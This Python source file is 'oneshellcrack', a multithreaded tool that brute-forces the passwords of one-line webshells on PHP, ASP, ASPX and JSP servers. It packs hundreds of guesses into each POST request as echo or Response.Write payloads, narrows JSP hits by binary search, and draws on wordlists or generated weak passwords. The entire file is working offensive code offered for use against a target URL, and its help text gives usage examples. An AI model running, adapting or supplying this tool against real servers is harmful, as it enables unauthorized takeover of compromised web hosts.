#!/usr/bin/env python
#-*-coding:UTF-8-*-
from __future__ import print_function
try:
    import requests
except:
    raise SystemExit('[Error] Please install "requests": pip install requests')
import re, sys, time, signal, argparse, itertools
from threading import Thread, BoundedSemaphore, Lock

__program__ = 'oneshellcrack'
__version__ = '1.0.1'
__author__ = 'L'
__github__ = 'https://github.com/L-codes/oneshellcrack'

headers = {'Content-Type': 'application/x-www-form-urlencoded',
           'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; en) Opera 9.26'}
attack = True
pwd = None
lock = Lock()
sends = 0

def interrupt_handler(signalnum, frame):
    raise SystemExit('\n\nInterrupt')


def binary_tree_crack(i, args, payload):
    with lock:
        print('\n[INFO] password in No.{}, BinaryTree attack...'.format(i))
    head = 'z0=UTF-8&z1={L-OneShellCrack}&'
    pwds = payload.split('&')[2:]
    while len(pwds) != 1:
        segmentation = len(pwds) // 2
        left_subtree, right_subtree, = pwds[:segmentation], pwds[segmentation:]
        r = requests.post(args.url, data=head+'&'.join(left_subtree), timeout=args.timeout, headers=headers)
        pwds = left_subtree if '{L-OneShellCrack}' in r.text else right_subtree
    return pwds[0][:-2]


def crack(i, args, payload):
    global attack, pwd

    try:
        padding = ' ' * 20
        for retry_i in range(args.max_retry + 1):
            try:
                r = requests.post(args.url, data=payload, timeout=args.timeout, headers=headers)
                with lock:
                    if retry_i:
                        print('\r[Retry] ({:2.2f}s) Retry the {} time CODE: {} No.{:<4} {}'.format(
                              r.elapsed.total_seconds(), retry_i, r.status_code, i, padding))
                    else:
                        print('\r[Crack] No.{:<4} ({:2.2f}s) CODE: {} - POST Content-Length: {}{}'.format(
                              i, r.elapsed.total_seconds(), r.status_code, len(payload), padding), end='')
                if r.status_code != 200:
                    continue
                if args.shell in ('php', 'asp', 'aspx'):
                    match = re.search(r'l(?P<pwd>.*?)codes', r.text)
                    if match and attack:
                        attack = False
                        pwd = match.group('pwd').replace('=', '&')
                elif '{L-OneShellCrack}' in r.text and attack:
                    attack = False
                    pwd = binary_tree_crack(i, args, payload)
                break
            except Exception as e:
                with lock:
                    print('\r[Error] ' + str(e).split('(')[0] + ' ' * 40)
    finally:
        semaphore.release()


def chain_pwd_files(files):
    for file in files:
        try:
            open_args = dict()
            if sys.version_info.major == 3:
                open_args = {'errors': 'ignore'}
            with open(file, **open_args) as f:
                for line in f:
                    yield line.strip()
        except Exception as e:
            print(str(e))


def weak_passwords(nums):
    default_pwd = '''chopper Cknife cknife abc123 12345 123456 passwd password
                     connect apple banana'''.split()
    pwds = [default_pwd]

    litters = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$'
    for len_pwd in range(1, nums + 1):
        pwds.append(map(''.join, itertools.product(*((litters, ) * len_pwd))))
    return itertools.chain(*pwds)
            

def create_payload(args):
    max_request = args.max_request
    context = 'l{1}codes'
    shell_payload = {'php':  '{0}=echo \'' + context + '\';',
                     'asp':  '{0}=Response.Write("' + context + '")',
                     'aspx': '{0}=Response.Write("' + context + '")',
                     'jsp':  '{0}=L' }
    template = shell_payload[args.shell]
    pwds = chain_pwd_files(args.pwd_files) if args.pwd_files else weak_passwords(args.weak_pwd_len)

    if args.shell == 'php':
        legal_pwd = re.compile(r'[a-zA-Z0-9!#$()*,\-./:;<>?@\\\[\]^_`{|}~\']+$')
    elif args.shell == 'jsp':
        legal_pwd = re.compile(r'[a-zA-Z0-9!#$()*,\-./:;<>?@\\\[\]^_`{|}~\'"]+$')
    elif args.shell in ('asp', 'aspx'):
        legal_pwd = re.compile(r'[a-zA-Z0-9!#$()*,\-./:;<>?@\\\[\]^_`{|}~&]+$')

    legal_pwd_match = legal_pwd.match
    jsp_head = 'z0=UTF-8&z1={L-OneShellCrack}&' if args.shell == 'jsp' else ''
    payload = set()
    counter = 0
    for pwd in pwds:
        if legal_pwd_match(pwd):
            counter += 1
            payload.add(template.format(pwd, pwd.replace('&', '=')))
            if len(payload) == max_request:
                if args.shell in ('asp', 'aspx'):
                    payload = set(map(str.lower, payload))
                yield jsp_head + '&'.join(payload)
                payload.clear()
    if payload:
        if args.shell in ('asp', 'aspx'):
            payload = set(map(str.lower, payload))
        yield jsp_head + '&'.join(payload)

    global pwd_total
    pwd_total = counter


def check(url):
    import socket

    try:
        domain = re.search(r'//(.*?)(:\d+)?/', url)
        host, port = domain.groups()
        port = int(port[1:]) if port else 80
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.settimeout(3)
        c.connect((host, port))
    except:
        raise SystemExit('[Error] Failed to connect to ' + url)
    finally:
        c.close()


def commandline():
    banner = '''\
  ___             ____  _          _ _  ____                _    
 / _ \ _ __   ___/ ___|| |__   ___| | |/ ___|_ __ __ _  ___| | __
| | | | '_ \ / _ \___ \| '_ \ / _ \ | | |   | '__/ _` |/ __| |/ /
| |_| | | | |  __/___) | | | |  __/ | | |___| | | (_| | (__|   < 
 \___/|_| |_|\___|____/|_| |_|\___|_|_|\____|_|  \__,_|\___|_|\_\\                                                           

               [ Author {}       Version {} ]

[ Github ] {}
'''.format(__author__, __version__, __github__)
    print(banner)
    default_shell_request_num = {'php': 1000, 'asp': 1000, 'aspx': 1000, 'jsp': 4000}
    parser = argparse.ArgumentParser(
       formatter_class=argparse.RawTextHelpFormatter,
       epilog='''\
use examples:
  python {0} http://localhost/shell.php 
  python {0} http://localhost/shell.jsp -n 1000 -m 300
  python {0} http://localhost/shell.asp -p pwd1.lst pwd2.lst'''.format(__program__ + '.py'))
    parser.add_argument('-m', '--max-threads', default=200, type=int, dest='max_threads', metavar='',
                        help='specify max threads [default: %(default)d]')
    parser.add_argument('-n', '--number', default=0, type=int, dest='max_request', metavar='',
                        help='specify max password request [default: auto]')
    parser.add_argument('-r', '--retry-nums', default=1, type=int, dest='max_retry', metavar='',
                        help='specify max retry request [default: %(default)d]')
    parser.add_argument('-s', '--shell', dest='shell', metavar='',
                        choices=['php', 'asp', 'aspx', 'jsp'],
                        help='specify webshell type')
    parser.add_argument('-t', '--timeout', default=8, type=int, dest='timeout', metavar='',
                        help='specify request timeout [default: %(default)d]')
    parser.add_argument('-w', '--weakpwd-len', default=4, type=int, dest='weak_pwd_len', metavar='',
                        help='specify weak possword lenghts [default: %(default)d]')
    parser.add_argument('-p', nargs='+', dest='pwd_files', metavar='FILE',
                        help='specify possword files [default: Weak passwords]')
    parser.add_argument('url', help='Target URL', metavar='URL')
    args = parser.parse_args()
    check(args.url)
    if not args.shell:
        shell = re.search(r'\.(php|asp|aspx|jsp)$', args.url)
        if shell:
            args.shell = shell.group(1)
        else:
            raise SystemExit('[INFO] Please use -s shell_type')
    if not args.max_request:
        args.max_request = default_shell_request_num[args.shell]
    return args


def main():
    global semaphore, sends

    signal.signal(signal.SIGINT, interrupt_handler)
    args = commandline()
    print(' ( Shell:{shell}, Numbers:{max_request}, Threads:{max_threads}, Retry:{max_retry} )\n'.format(**args.__dict__))

    semaphore = BoundedSemaphore(value=args.max_threads)
    stopwatch_start = time.time()
    for i, payload in enumerate(create_payload(args), 1):
        if attack:
            sends = i
            semaphore.acquire()
            t = Thread(target=crack, args=(i, args, payload))
            t.setDaemon(True)
            t.start()

    for _ in range(args.max_threads):
        semaphore.acquire()

    stopwatch = time.time() - stopwatch_start
    words = args.max_request * sends if sends else pwd_total
    speed = words / stopwatch if stopwatch else 0
    msg = '[Success] Password: {}'.format(pwd) if pwd else '[Failed] No password found'
    print('\n\n{msg}\n[Finish] {words} words in {stopwatch:.3f} seconds. ({speed:.0f} w/s)'.format(**locals()))
    

if __name__ == '__main__':
    main()
